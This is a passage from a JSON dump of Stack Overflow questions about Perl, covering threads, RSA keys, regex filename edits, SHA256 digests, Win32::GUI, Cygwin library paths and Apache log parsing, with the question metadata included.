advance.</p>\n"},{"tags":["php","python","linux","perl","excel"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12572548,"title":"Replace single sheet in Excel file without touching others","body":"<p>I'm trying to export to an Excel file using the \"static template + dynamic data = output\" approach.</p>\n\n<p>However, pretty much every library will fully read in the template, and when saving the file things will get lost/corrupted (charts, pivot tables, ...).</p>\n\n<p>Is there a way to replace just the data in a single (very simple) sheet, without touching the other sheets?</p>\n\n<p>Any language / tool that can be easily run from a Linux environment will do.</p>\n"},{"tags":["multithreading","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12570184,"title":"perl how to use is_running","body":"<p>my program is like:</p>\n\n<pre><code>use strict;\nuse threads;\nuse threads::shared;\n\nmy @thr;\nfor (my $i = 0; $i &lt; $ARGV[0]; $i++) {\n    $thr[$i] = threads-&gt;create(\\&amp;Iteration, $i);\n}\n\nforeach (@thr) {\n    if ($_-&gt;is_running()) {\n        print \"no\";\n    }\n    else{\n        $_-&gt;join;\n    }\n}\n\nsub Iteration {\n    my $in = shift;\n    print \"test$in\\n\";\n}\n</code></pre>\n\n<p>But when I run it with $ARGV[0], say 5, the output is </p>\n\n<pre><code>test2\ntest1\ntest0\ntest3\ntest4\nCan't locate auto/threads/is_running.al in @INC \n</code></pre>\n\n<p>So, how can I use the is_running() statement to check the status of one of my threads?</p>\n"},{"tags":["perl","encryption","cryptography","rsa","encryption-asymmetric"],"answer_count":1,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":144,"score":4,"question_id":12569376,"title":"RSA keys in Perl","body":"<p>I have simple RSA encoding/decoding script, such as:</p>\n\n<pre><code>use Crypt::RSA;\n\nmy $rsa = new Crypt::RSA;\nmy($public, $private) = $rsa-&gt;keygen( Size =&gt; 2048 )\n                        or die $rsa-&gt;errstr();\n\nmy $email = '...';\n\nmy $em = $rsa-&gt;encrypt( Message =&gt; $email, Key =&gt; $public  );\nmy $dm = $rsa-&gt;decrypt( Ciphertext =&gt; $em, Key =&gt; $private );\n\nprint \"$dm\\n\";\n</code></pre>\n\n<p>However I want to modify this script to use RSA keys as <strong>e</strong>, <strong>d</strong> and <strong>n</strong> values, such as:</p>\n\n<pre><code>e =&gt; 10001\nd =&gt; 135b03530e94874283f0f0000ffff0001\nn =&gt; 24000c6c9620886831124848640044901\n</code></pre>\n\n<p>How can I <strong>convert</strong> these three parameters into <code>Crypt::RSA::Key</code> objects and vice versa?</p>\n\n<p>Or, how can I use these three parameters with <code>Crypt::RSA</code> for encryption and decryption?</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12568699,"title":"Perl regular expression to modify a filename","body":"<p>I am trying to remove the Ist part and last part of the file name. \nI have a filename like  <code>/external/prop/new/test/File.Name.will.BE.this.extension.date</code>\nI want to remove the first part of the directory (<code>/external</code>)  and the last part of the filename extension (<code>.date</code>)  so my output file name would be <code>/prop/new/test/File.Name.will.BE.this.extension</code></p>\n\n<p>eg:    </p>\n\n<ul>\n<li>OLD  FILE name:   <code>/external/prop/new/test/FACL.Prop.for.BBG.txt.09242012</code> </li>\n<li><p>NEW FILENAME: <code>/prop/new/test/FACL.Prop.for.BBG.txt</code></p></li>\n<li><p>OLD  FILE name: <code>/external/prop/old/test/set2/FACL.Prop.FITCH.csv.09242012</code> </p></li>\n<li>NEW FILENAME:  <code>/prop/old/test/set2/FACL.Prop.FITCH.csv</code></li>\n</ul>\n\n<p>I had tried something like</p>\n\n<pre><code>my($FinalName, $Finalextension) = split /\\.(?!.*\\.)/, substr($Fname,$Flength);\n</code></pre>\n\n<p>but it is not quite helpful. </p>\n\n<p><code>/external</code> will always remain the same but the date will always vary and I can't just remove the numbers as the .extension can be numbers. </p>\n"},{"tags":["perl","perl-module","multimarkdown"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12517035,"title":"Keep Multimarkdown from formatting the whole delimited csv field","body":"<p>I have a csv file (converted to txt) in which the fields are enclosed with \" marks, so that when I use the following regex to find them:</p>\n\n<pre><code>\"(?&gt;(?:[^\"]+|\"\")*)\"\n</code></pre>\n\n<p>each fields stays separate, but when I go to convert the selected field using MultiMarkdown the quotes are included in the formatted html. So that </p>\n\n<pre><code>\"The model is ideal for those\n</code></pre>\n\n<p>becomes:</p>\n\n<pre><code>&lt;p&gt;&amp;quot;The model is ideal for those\n</code></pre>\n\n<p>how do I have multimarkdown just process what is between fields beginning and ending quotes?</p>\n"},{"tags":["windows","perl","iis6"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12485158,"title":"Make Files Accessible by Perl Script but Blocked from Web Access - IIS6","body":"<p>I am using perl on a windows 2003 server with IIS6.  I have written a script that needs to access confidential files uploaded by the user.  The files are stored in a folder in the cgi-bin.  However, I do not want the files to be accessible via weblink.  So, I have 'read access' for this particular folder disabled in IIS.</p>\n\n<p>The files are not accessible via weblink, but I need for the user to be able to open the documents that he/she uploaded.</p>\n\n<p>The users logins (usernames and passwords) are stored in the cgi-bin in a csv file.</p>\n\n<p>I've searched the database but couldn't find anything exactly matching this situation.</p>\n\n<p>Any ideas would be greatly appreciated!</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12558762,"title":"Perl: Navigate a website, fill up form and launch browser (without submitting)","body":"<p>I am looking for perl code to go to a website, navigate through a couple of links, fill up a form and then submit it. However, I want to launch the page with the filled up form in IE so that I can see exactly what's being submitted (and do a sanity check, perhaps change a couple of words) before actually submitting it.</p>\n\n<p>I realize mechanize can be used to create the form and submit it automatically - but I'm stuck on how to \"launch the filled up form webpage in a browser\" part. Any help would be much appreciated. </p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","hash","md5","sha","sha256"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":691,"score":1,"question_id":9991757,"title":"SHA256 digest in perl","body":"<p>I need to do SHA256 hashing of email addresses and I need the result as a String.</p>\n\n<p>I tried the following:</p>\n\n<pre><code>  use Digest::SHA qw(sha256);\n  my $data = 'swaranga@gmail.com';\n  my $digest = sha256($data);\n\n  print $digest;\n</code></pre>\n\n<p>But it prints something like: </p>\n\n<pre><code>B/D6i1ÃÂ¼Ã»^ÃÂ©Q;Â¢Ã\n</code></pre>\n\n<p>I need the output as follows: </p>\n\n<pre><code>cbc41284e23c8c7ed98f589b6d6ebfd6\n</code></pre>\n\n<p>The above hash is generated using SHA256 generator of <a href=\"http://commons.apache.org/codec/apidocs/org/apache/commons/codec/digest/DigestUtils.html\" rel=\"nofollow\">Apache DigestUtils</a>.</p>\n\n<p>What am I doing wrong? I am a newbie in perl, so excuse if it is something silly.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12566751,"title":"how to get cgi_error() function invoked in a perl-cgi script","body":"<p>I have a perl -cgi script in which I need to test something based on when cgi_error() happens. Could some one please let me know under what scenario cgi_error() function gets invoked. I tried below </p>\n\n<ol>\n<li>changed owner and permissions on the script </li>\n</ol>\n\n<p>But that has not helped so far. </p>\n\n<p>This is code snippet </p>\n\n<pre><code>use CGI qw(-compile :standard);\n.....\n\n if (cgi_error()) {\n...\n}\n</code></pre>\n\n<p>It would be great if some one can explain when cgi_error() is invoked automatically in the script. </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12561822,"title":"extracting paragraphs from text with perl","body":"<p>I want to extract the paragraphs from a text variable that retrieved from the DB.</p>\n\n<p>for extracting the pargaphs from file handler i use the below code :</p>\n\n<pre><code>local $/ = undef;\n@paragarphs =&lt;STDIN&gt; \n</code></pre>\n\n<p>what is the best option to extract paragraphs from a text variable using perl and if there are module on cpan that do this type of task ?</p>\n"},{"tags":["perl","security","ip","openvpn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12546285,"title":"OpenVPN failure, CGIIRC miracle or just a misunderstanding?","body":"<p>I'm getting on trouble while i'm trying to install a IRC secured by OpenVPN.</p>\n\n<p>let's take a look on my steps :<br>\nat this point my IP (the true one) is : 92.148.169.247<br>\n1) i create user account on my website<br>\n2) i generate OpenVPN certificate, download them and connect to the OVPN server.<br>\n  At this point my IP is become : 88.191.149.66 (seen with monip.org)<br>\n3) i connect to the CGIIRC (webIRC) interface (PERl written version)<br></p>\n\n<p>This CGIIRC is configured so it can only accept connection from the openVPN server IP (88.191.149.66).</p>\n\n<p>The point is :<br> when i try to connect to CGIIRC, it refuse my connection, and tell me that my \"true\" IP, 92.148.169.247 isn't allowed.<br>\nHow CGIIRC can see my true IP ? I thought that OPenVPN would hide my IP to only show his server IP adresse instead of mine.<br></p>\n"},{"tags":["javascript","perl","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":11437315,"title":"Replace JavaScript code of HTML files with Perl","body":"<p>I am trying to insert a piece of JavaScript before the closing <code>&lt;\\body&gt;</code> tag of over 2000 HTML files. This is what I have tried. But it does not do the job.</p>\n\n<pre><code>perl -pi -w -e 's/\\&lt;\\/body\\&gt;/\\&lt;div id=\\\"fb-root\\\"\\&gt;\\&lt;\\/div\\&gt;\n    \\&lt;script type=\\\"text\\/javascript\\\" src=\\\"https:\\/\\/connect.facebook.net\\/en_US\\/all.js\\\"\\&gt;\\&lt;\\/script\\&gt; \n    \\&lt;script type=\\\"text\\/javascript\\\"\\&gt;\n\n    FB.init\\(\\{\n        appId: \\\"446059218762070\\\", \n        status: true, \n        cookie: true, \n        xfbml: true\n    });\n\n    \\/\\* As of Jan 2012 you need to use \\*\\/\n    FB.Canvas.setAutoGrow\\(2\\);\n    \\&lt;\\/script\\&gt;\n\\&lt;\\/body\\&gt;/g' *.html\n</code></pre>\n\n<p>I have done some other replacement scripts with <code>perl -pi</code>, that worked well like</p>\n\n<pre><code>perl -pi -w -e 's/\\&lt;a href=\\\"index.html\\\"\\&gt;/\\&lt;a class=\\\"top_button\\\" href=\\\"index.html\\\"\\&gt;/g' *.html\n</code></pre>\n\n<p>and</p>\n\n<pre><code>perl -pi -w -e 's/\\&lt;link rel=\\\"STYLESHEET\\\" type=\\\"text\\/css\\\" href=\\\"default.css\\\"\\&gt;/\\&lt;link rel=\\\"STYLESHEET\\\" type=\\\"text\\/css\\\" href=\\\"default.css\\\"\\&gt;\n\\&lt;script type=\\\"text\\/javascript\\\" src=\\\"https:\\/\\/ajax.googleapis.com\\/ajax\\/libs\\/jquery\\/1.4\\/jquery.min.js\\\"\\&gt;\\&lt;\\/script\\&gt;\n\\&lt;script type=\\\"text\\/javascript\\\" src=\\\"default.js\\\"\\&gt;\\&lt;\\/script\\&gt;/g' *.html\n</code></pre>\n\n<p>Can anyone help me? what is wrong with my one-liner Perl script?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":134,"score":0,"question_id":12554179,"title":"Difference between \"perl\" and \"perl -w\"?","body":"<p>I am learning Perl , very new user . May i know whats the difference between these Perl codes.</p>\n\n<pre><code>#!/usr/bin/perl\n</code></pre>\n\n<p>&amp;</p>\n\n<pre><code>#!/usr/bin/perl -w\n</code></pre>\n"},{"tags":["perl","data-structures","graph-theory","graph-traversal"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":659,"score":2,"question_id":1685063,"title":"Six degrees of Kevin Bacon in Perl","body":"<p>First yes, this is a homework project for my Perl class.  I am not looking for the answer (although that would be sweet).  As I understand it I need to use a BFS and a regular expression to organize my data for use.  I need some direction on this one.  How do I use a BFS?  Do I use a massive stack and go through each item in the stack?  Should I use a giant hash table?  Has anyone worked on this problem?  How did you go about doing it?  I just need some direction is all.  Is this similar to a BST?  Is this possible without using the graph module?  Is this possible using hash values?  </p>\n"},{"tags":["windows","perl","winapi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12541794,"title":"BrowseForFolder() window does not open at the foreground, hides (Perl Win32::GUI)","body":"<p>When calling Perl <code>Win32::GUI::BrowseForFolder()</code>, the desktop (naturally) has several earlier windows on it. It turns out that the <code>BrowseForFolder()</code> window hides behind those windows. This is sometimes confusing and annoying, because you may not realize the program is asking you for a folder name, and you may think there is a bug. (This is in difference from (for example)  <code>Win32::GUI::GetOpenFileName()</code> or <code>GetSaveFileName()</code>, which do pop up at the foreground!).</p>\n\n<p>My question is: how to make <code>BrowseForFolder()</code> come to the foreground?</p>\n\n<p>One possibility is to find its handle, and then raise it to the foreground.</p>\n\n<p>Note that <code>-addexstyle =&gt; WS_EX_TOPMOST</code> doesn't have an effect (see below).</p>\n\n<p>Here is a complete (compileable and running) code example. (5.014 is not essential) </p>\n\n<pre><code>use strict;\n\nuse warnings;\nuse 5.014;      \nuse Win32::GUI();\nuse Win32::GUI qw{ WS_EX_TOPMOST};\nmy ($InputDir, $TopDir, $InputFileName, $dw, $dh, $desktop, $Window);\n\n$TopDir = 'D:\\My documents';    # Change this to an existing direcotry of yours\n$desktop = Win32::GUI::GetDesktopWindow();\n$dw = Win32::GUI::Width($desktop);\n$dh = Win32::GUI::Height($desktop);\n$Window = Win32::GUI::Window-&gt;new( -name =&gt; 'main', -text =&gt; 'Main window',\n    -pos =&gt; [20/100*$dw, 20/100*$dh], -size =&gt; [50/100*$dw, 60/100*$dh],\n    -onTerminate =&gt; \\&amp;TerminateWindow,\n    -addexstyle =&gt; WS_EX_TOPMOST,   -dialogui =&gt; 1, -tabstop =&gt; 1, -cancel =&gt; 1, );\n$Window -&gt; AddButton ( -name =&gt; 'ButtonCommit', -pos =&gt; [10,10], \n    -size =&gt;[16/100*$dw,3.5/100*$dh], -text =&gt; 'Commit changes', -onClick =&gt; \\&amp;Commit);\nsub Commit {\n$InputDir = Win32::GUI::BrowseForFolder( -root =&gt; $TopDir, -includefiles =&gt; 1,\n                -title =&gt; 'Select directory for parameter file', \n                -text =&gt;'Selext directory for parameter file',\n                -size =&gt; [50/100*$dw, 50/100*$dh], -addexstyle =&gt; WS_EX_TOPMOST,);\n$InputFileName = Win32::GUI::GetOpenFileName( -title  =&gt; 'Select the input file',\n    -directory =&gt; $InputDir, -file   =&gt; \"\\0\" . \" \" x 256,\n    -filter =&gt; [\"Text files (*.txt)\" =&gt; \"*.txt\", \"All files\", \"*.*\", ],\n    -text =&gt; 'text Select input file');\n} # end sub Commit\n$Window -&gt;Show();\nWin32::GUI::Dialog();\nsub TerminateWindow {\nreturn -1;\n}\n</code></pre>\n\n<p>Click the \"Commit changes\" button, then minimize the main window, and only then you see the \"hiding\" <code>BrowseForFolder()</code> window. </p>\n\n<p>Note that the <code>BrowseForFolder()</code> window hides behind other windows, and you need to minimize other windows to get to it. All other Perl <code>Win32::GUI</code> windows do open up at the foreground.</p>\n\n<p>Furthermore, note that <code>-addexstyle =&gt; WS_EX_TOPMOST</code> doesn't have an effect, while it usually does in Perl <code>Win32::GUI</code> windows.</p>\n\n<p>Note: change the <code>D:\\My documents</code> to an existing directory.</p>\n\n<p>Related question: How does one find the desktop windows handles? If we could find <code>BrowseForFolder()</code>'s handle, we could raise it to the foreground.</p>\n\n<p>(Note: similar question cross-posted at PerlMonks: <a href=\"http://perlmonks.org/?node_id=994815\" rel=\"nofollow\">http://perlmonks.org/?node_id=994815</a>)</p>\n"},{"tags":["linux","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12553852,"title":"How can I replace special character in a string with underscores using a Perl script?","body":"<p>I have a script taking mythtv recorded shows and encoding them in h264 using handbrake. the script is written in Perl. </p>\n\n<p>My questions is how do I replace spaces and special characters with and underscore using perl?</p>\n\n<p>The strings look something like this when output <code>\"Parks and Recreation - S05E01 - Ms. Knope Goes to Washington\"</code></p>\n\n<p>I would like it to look like this</p>\n\n<blockquote>\n  <p>Parks_and_Recreation_S05E01_Ms__Knope_Goes_to_Washington</p>\n</blockquote>\n\n<p>Thanks in advance. I did do some googling but having found anything useful that I can implement.</p>\n"},{"tags":["regex","perl","unix"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12561985,"title":"perl regex to extract a specifc word","body":"<p>I have the following exmaple of a text file:</p>\n\n<pre><code>AFUA_2G08360|pyrG\nAFUA_2G12630\ngel1|bgt2|AFUA_2G01170\n</code></pre>\n\n<p>and I wish to do a regex to filter out <code>AFUA_2G08360</code>, <code>AFUA_2G12630</code>, <code>AFUA_2G01170</code> using <code>perl -l -ne</code> in unix command line.<br>\nHow would you suggest to do that?</p>\n"},{"tags":["perl","ubuntu","wget"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12560165,"title":"Download file directly to FTP server","body":"<p>I want to download a big file from a normal http-link to an ftp-server (under ubuntu) without storing the file locally (as my local storage is too small).</p>\n\n<p>Do you have any ideas how to do this with wget or a small perl-script? (I don't have sudo-rights on the local machine).</p>\n"},{"tags":["perl","gtk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12561864,"title":"Working with windows in Gtk2-Perl","body":"<p>I am working on a Gtk2-Perl project, where I have to create a GUI. Now I have to do one thing, that whenever the user selects 'Single' Radio button, or the 'Multiple' Radio button, either a seperate screen should come up, or the content of the same window should change.</p>\n\n<p>Ex: when user selects Single: He should be having 4 buttons, But when he selects Multiple: he should be having 10 buttons, and some more widgets.</p>\n\n<p>Can someone help me in creating a pop up window, which will contain respective widgets, on selection of appropriate radio button. Or any help regarding, callbacks where we can add buttons and widgets.</p>\n"},{"tags":["perl","url","join"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":329,"score":2,"question_id":1813678,"title":"How do I create an absolute URL from two components, in Perl?","body":"<p>Suppose I have:</p>\n\n<pre><code>my $a = \"http://site.com\";\nmy $part = \"index.html\";\nmy $full = join($a,$part);\nprint $full;\n&gt;&gt; http://site.com/index.html\n</code></pre>\n\n<p>What do I have to use as <code>join</code>, in order to get my snippet to work?</p>\n\n<p>EDIT: I'm looking for something more general. What if <code>a</code> ends with a slash, and <code>part</code> starts with one? I'm sure in some module, someone has this covered.</p>\n"},{"tags":["mysql","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12558352,"title":"should I escape code stored in mysql db or use placeholders?","body":"<p>I just found out about placeholders in DBI  <a href=\"http://search.cpan.org/~timb/DBI-1.622/DBI.pm#Placeholders_and_Bind_Values\" rel=\"nofollow\">http://search.cpan.org/~timb/DBI-1.622/DBI.pm#Placeholders_and_Bind_Values</a> and it seems to be handling various codes pretty well.\nShould I be forcing escape regardless? Are there any scenarios where the placeholders would fail based on the input?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12559948,"title":"making archive with perl, when path is with spaces","body":"<p>How can I use path with spaces in a perl script, running Archive commend?</p>\n\n<p>Saying this is the command with the path I need:</p>\n\n<pre><code>C:\\\\\"Program Files\"\\\\7-Zip\\\\7z.exe a d:\\\\views\\\\\"My views\" d:\\\\\"Public view\"\n</code></pre>\n\n<p>Someone has an idea?</p>\n"},{"tags":["perl","email","unix","smtp","sendmail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12557316,"title":"Custom X-header with Sendmail","body":"<p>I would like to configure <strong>sendmail</strong> to include <strong>two custom X-headers</strong> with values <strong>calculated based on</strong> the full <strong>email content/body</strong>. Is it possible to use <strong>perl script</strong> with sendmail to add such custom headers to <strong>each email message sent</strong>?</p>\n\n<p>Please advice. Thank you.</p>\n"}]}
{"total":22324,"page":16,"pagesize":100,"questions":[{"tags":["mysql","perl","osx","cpan","movabletype"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":208,"score":2,"question_id":3197056,"title":"MySQL driver module issue with Movable Type","body":"<p>I am able to get mt-check to run, but it says that DBD::MySQL module is not installed.  Here is what it says:</p>\n\n<pre><code>DBI (version &gt;= 1.21)\nYour server has DBI installed (version 1.52).\n\nDBD::mysql\nYour server does not have DBD::mysql installed, or DBD::mysql requires another module that is not installed. The DBD::mysql database driver is required to use MySQL Database. Please consult the installation instructions for help in installing DBD::mysql.\n</code></pre>\n\n<p>However, when I run <code>sudo cpan DBD:mysql</code> it says that it is up-to-date:</p>\n\n<pre><code>CPAN: Storable loaded ok (v2.19)\nGoing to read /Users/.../.cpan/Metadata\nDatabase was generated on Thu, 01 Jul 2010 04:28:19 GMT\nDBD::mysql is up to date (4.014).\n</code></pre>\n\n<p>When I try to run mt.cgi I get an error:</p>\n\n<pre><code>install_driver(mysql) failed: Can't locate DBD/mysql.pm in @INC...\n</code></pre>\n\n<p>When I checked <code>perl -V</code> (or <code>sudo perl -V</code>) the <code>@INC</code> value doesn't include the path that is listed by cpan for being correctly installed.</p>\n\n<p>Is the issue that it is installed for me (user) rather than the system?  Do I need to reinstall the module?  Have you come across this?</p>\n\n<p>If it helps, I am using Mac OS 10.5.5 with MT 4.3.2.I</p>\n\n<p>Any help is greatly appreciated.</p>\n\n<p>Thanks!</p>\n"},{"tags":["regex","perl","loops"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12344261,"title":"REGEX matching and extraction","body":"<p>I have a file consisting of many set of values. I am trying to just extract the required lines that matched in a file once a REGEX is found.\nFile.txt</p>\n\n<pre><code>    ...... \n    ......\n    TRIP (\n            ?name           \"model\"\n            ?prompt         \"Model name\"\n            ?defamount       \"USD100\"\n            ?type           \"adventure\"\n            ?display        \"no\"\n            ?photos       \"800\"\n               )\n    TRIP (\n            ?name           \"macro\"\n            ?prompt         \"macro model name\"\n            ?defamount       \"USD500\"\n            ?type           \"adventure\"\n            ?display        \"no\"\n            ?photos       \"1200\"\n            )\n      TRIP( \n            ?name           \"description\"\n            ?prompt         \"description\"\n            ?defamount       \"USD400\"\n            ?type           \"historical\"\n            ?display        \"yes\"\n            ?photos       \"900\"\n             )\n            .......\n........\n.....\n.......\n......\n</code></pre>\n\n<p>I want to extract the line with \"name and model\" then \"name and description\" along with these line i want to extract the 1st \"defamount\" once the the line with \"name and model\" then \"name and description\" are matched.\nI tried with loops but i wasnt succesful</p>\n\n<pre><code>use strict;\nopen FILE, \"&lt;File.txt\";\nopen FILE2, \"&gt;&gt;data1.l\";\n\nwhile (my $string = &lt;FILE&gt;) {\n\n    if ($string =~ m/^ CELL/ig) {\n\n        print FILE2 $string;\n    }\n    elsif ($string =~ m/\"model\"/i) {\n\n        print FILE2 $string;\n    }\n    elsif ($string =~ m/defamount/o) {\n\n        print FILE2 $string;\n    }\n    elsif($string =~ m/\"description\"/i) {\n\n        print FILE2 $string;\n    }\n    elsif($string =~ m/defamount/o) {\n\n        print FILE2 $string;\n    }\n}\nclose FILE;\nclose FILE2; \n</code></pre>\n\n<p>This gives me all the \"defamount\" lines from the file, but i want just the 1st defamount after the matching the above mentioned regex</p>\n"},{"tags":["perl","dll","cygwin","ld","library-path"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12554420,"title":"How can I make Cygwin/perl load a specific library Ã  la LD_LIBRARY_PATH/LD_RUN_PATH?","body":"<p>The issue I'm seeing is that the wrong version of a library gets loaded in a <code>perl</code> process running on Cygwin (1.7.15, current as of 09/2012).</p>\n\n<p>Briefly, <code>perl</code> starts, does <code>use XML::LibXML</code>, which is the Perl interface to <code>libxml2</code>, Daniel Veillard's C library for XML, and the Perl/C glue then loads the C library. Now, there's two versions installed, an older one in <code>/usr/lib</code> and a more recent one in <code>/usr/local/lib</code> - a typical scenario. The Perl/C glue libary (<code>XML::LibXML</code>) is compiled against the newer version in <code>/usr/local/lib</code>. The Perl or Cygwin component responsable for loading libraries, however, picks up the older one. This triggers a warning by the Perl/C glue code, which rightly expects and demands the version it was compiled against. (It would still mostly work because of backward compatibility, but not quite as intended.)</p>\n\n<p>One thing to note, on Cygwin it's not <code>lib/libxml2.so.2</code>, but rather <code>bin/cygxml2-2.dll</code>!</p>\n\n<p>Here's the action copied from the screen:</p>\n\n<pre><code>MiLu@Dago: /tmp &gt; export LD_LIBRARY_PATH=/usr/local/bin\nMiLu@Dago: /tmp &gt; export LD_RUN_PATH=/usr/local/bin\nMiLu@Dago: /tmp &gt; ls -l /usr/bin/cygxml2-2.dll\n-rwxr-xr-x 1 MiLu root 1096206  1. Mrz 2012  /usr/bin/cygxml2-2.dll\nMiLu@Dago: /tmp &gt; ls -l /usr/local/bin/cygxml2-2.dll\n-rwxr-xr-x 1 MiLu None 3997813 21. Mai 22:35 /usr/local/bin/cygxml2-2.dll\nMiLu@Dago: /tmp &gt; perl -MXML::LibXML -e1\nWarning: program compiled against libxml 208 using older 207\nWarning: XML::LibXML compiled against libxml2 20800,\n                 but runtime libxml2 is older 20708\n</code></pre>\n\n<p>I'm not sure how the C library <code>cygxml2-2.dll</code> (standard name <code>libxml2</code>) gets loaded.</p>\n\n<p>Here's the <code>ldd</code> output for the Perl/C glue library:</p>\n\n<pre><code>$ ldd /usr/lib/perl5/site_perl/5.14/i686-cygwin-threads-64int/auto/XML/LibXML/LibXML.dll\n    ntdll.dll       =&gt; /cygdrive/c/Windows/SysWOW64/ntdll.dll (0x774a0000)\n    kernel32.dll    =&gt; /cygdrive/c/Windows/syswow64/kernel32.dll (0x756c0000)\n    KERNELBASE.dll  =&gt; /cygdrive/c/Windows/syswow64/KERNELBASE.dll (0x76750000)\n    cygwin1.dll     =&gt; /usr/bin/cygwin1.dll (0x61000000)\n    cygssp-0.dll    =&gt; /usr/bin/cygssp-0.dll (0x6af50000)\n&gt;&gt;&gt; cygxml2-2.dll   =&gt; /usr/local/bin/cygxml2-2.dll (0x63fc0000) &lt;&lt;&lt;\n    cygz.dll        =&gt; /usr/bin/cygz.dll (0x6a900000)\n    cyggcc_s-1.dll  =&gt; /usr/bin/cyggcc_s-1.dll (0x6ca60000)\n    cygiconv-2.dll  =&gt; /usr/bin/cygiconv-2.dll (0x6c390000)\n    cygperl5_14.dll =&gt; /usr/bin/cygperl5_14.dll (0x6b8a0000)\n    cygcrypt-0.dll  =&gt; /usr/bin/cygcrypt-0.dll (0x6d3d0000)\n    ???             =&gt; ??? (0x520000)\n</code></pre>\n\n<p>As you can see, the newer library is correctly located, as would happen on UNIX. But <code>ldd</code> is not the actual process, which might use a different lookup mechanism.</p>\n\n<p>Using <code>strace perl â¦ | grep -i cygxml</code> shows no output.</p>\n\n<p>It seems to me that <code>LD_LIBRARY_PATH</code> and <code>LD_RUN_PATH</code> are ignored. Because if not why do I get the version mismatch warning?</p>\n\n<p>Is the library loading mechanism specific to <code>perl</code> or Cygwin? How does it work? How do I make <code>perl</code> or Cygwin load the proper library?</p>\n\n<p>[One suspicion I have is that <code>perl</code> residing in <code>/usr/bin</code>, it will <em>first</em> look for libraries in <code>/usr/bin</code>, its binarie's directory, thus following the Windows convention rather than the UNIX convention.]</p>\n"},{"tags":["perl","apache","bash","alias"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12557908,"title":"Difficulty running a Perl script as a Bash alias","body":"<p>To format my apache error_log so that it is more pleasurable to look at I have written a quick and dirty perl script. </p>\n\n<pre><code>tail -f /var/log/apache2/error_log | perl -ne \n  '($timeStamp, $error, $hostName, $message) = \n      /^\\[([^\\]]+)\\] \\[([^\\]]+)\\] (?:\\[client ([^\\]]+)\\])?\\s*(.*)$/i; # Parse log\n   ($day, $month, $date, $time, $year) = \n      $timeStamp =~ m/(\\S*) (\\S*) (\\S*) (\\S*) (\\S*)$/; # Extract the timestamp\n   $message =~ s/, referer: (.*)$/\\./;  # Strip the referer references\n   $message =~ s/\\\\n/\\n/g; # Replace literal new lines to expand object dumps\n   print $time . \" \" . $date . \" \" . $month . \" | \" . $message .\"\\n\";'\n</code></pre>\n\n<p>I want to add the script to a Bash alias so that I can call it easily from terminal.</p>\n\n<p>e.g.</p>\n\n<pre><code>alias te=tail -f /var/log/apache2/error_log | perl -ne '($timeStamp, $error, $hostName, $message) = /^\\[([^\\]]+)\\] \\[([^\\]]+)\\] (?:\\[client ([^\\]]+)\\])?\\s*(.*)$/i; ($day, $month, $date, $time, $year) = $timeStamp =~ m/(\\S*) (\\S*) (\\S*) (\\S*) (\\S*)$/; $message =~ s/, referer: (.*)$/\\./; $message =~ s/\\\\n/\\n/g; print $time . \" \" . $date . \" \" . $month . \" | \" . $message .\"\\n\";'\n</code></pre>\n\n<p>Obviously escaping quotes starts to get messy. I've also tried putting the perl script in its own file and running that as an alias but I want to avoid having to run a script outside of the .bash_profile file for portability.</p>\n\n<p>How can I use the perl script as a bash alias/function? Or am I coming at this from totally the wrong direction? </p>\n"},{"tags":["ruby","regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":2,"view_count":83,"score":1,"question_id":12556897,"title":"another regex which does the same as \"diff.*\\n.*\\n.*\\n.*\\n.*\\n \"","body":"<p>I have this 